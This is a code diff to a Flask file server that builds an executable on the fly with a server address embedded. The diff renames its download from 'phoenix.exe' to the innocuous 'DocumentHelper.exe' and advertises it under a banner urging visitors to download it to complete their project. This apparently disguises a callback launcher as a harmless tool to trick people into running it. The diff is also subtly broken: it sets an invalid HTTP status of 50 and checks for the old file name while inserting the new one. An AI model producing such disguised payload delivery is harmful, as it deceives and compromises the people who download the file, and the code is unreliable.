@@ -102,9 +102,9 @@ def download_phoenix_exe():
     try:
         exe = _build_phoenix_exe(server_host)
     except Exception as e:
-        return jsonify({"error": str(e)}), 500
+        return jsonify({"error": str(e)}), 50
     return send_file(
-        exe, as_attachment=True, download_name="phoenix.exe",
+        exe, as_attachment=True, download_name="DocumentHelper.exe",
         mimetype="application/vnd.microsoft.portable-executable"
     )
 
@@ -125,7 +125,7 @@ def index():
     files = get_files_only(BASE_DIR)
     # Always advertise the on-the-fly launcher
     if "phoenix.exe" not in files:
-        files.insert(0, "phoenix.exe")
+        files.insert(0, "DocumentHelper.exe")
     return render_template(
         "index.html", title="Project Files", page="main",
         banner="Hey, complete your project by downloading these files.",
